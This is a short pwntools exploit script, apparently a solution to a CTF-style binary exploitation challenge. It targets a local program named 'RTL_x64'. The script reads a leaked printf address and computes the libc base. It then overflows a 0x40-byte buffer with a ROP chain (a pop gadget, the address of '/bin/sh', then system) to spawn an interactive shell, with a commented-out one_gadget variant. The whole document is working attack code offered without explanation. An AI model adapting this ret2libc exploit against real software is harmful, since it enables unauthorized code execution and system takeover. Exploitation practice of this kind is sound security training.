#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
p = process("./RTL_x64")
elf = ELF("./RTL_x64")
p1ret = 0x400a13
libc = elf.libc
p.sendafter("> ", '2')
p.recvuntil(": ")
printf = int(p.recv(14), 16)
log.info("printf : "+hex(printf))
libcBase = printf - libc.symbols['printf']
log.info("libcBase : "+hex(libcBase))
system = libcBase + libc.symbols['system']
binsh = libcBase + list(libc.search('/bin/sh'))[0]
one_gadget = libcBase + 0xf1147

p.sendafter("> ", '1')
p.send('A'*(0x40+0x8) + p64(p1ret) + p64(binsh) + p64(system))
#p.sendafter("input: ", 'A'*(0x40+0x8) + p64(one_gadget))
p.sendlineafter("> ", '3')

p.interactive()
